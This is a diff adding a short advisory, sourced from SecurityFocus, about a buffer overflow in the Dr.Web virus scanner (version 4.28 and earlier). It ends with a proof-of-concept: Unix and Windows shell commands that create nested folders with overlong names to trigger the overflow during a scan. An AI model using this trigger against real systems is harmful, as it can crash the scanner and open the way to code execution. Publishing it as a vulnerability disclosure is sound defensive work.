@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/7022/info
+
+A buffer overflow vulnerability has been reported for Dr. Web virus scanner. The vulnerability is due to insufficient bounds checking when processing folder names.
+
+An attacker is able to exploit this vulnerability by creating a malicious folder name of excessive length. When a virus scan is initiated, processing the folder name will trigger the buffer overflow condition. Successful exploitation of this issue will result in the execution of attacker-supplied code with the privileges of the Dr. Web virus scanner process.
+
+This vulnerability has been reported for Dr.Web version 4.28 and earlier. 
+
+set a= AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAA
+set b= BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBB
+
+mkdir /$a
+mkdir /$a/$b
+
+Or:
+
+SET A = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAA
+SET B = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBB
+
+mkdir \\?\c:\%A%
+mkdir \\?\c:\%B% 
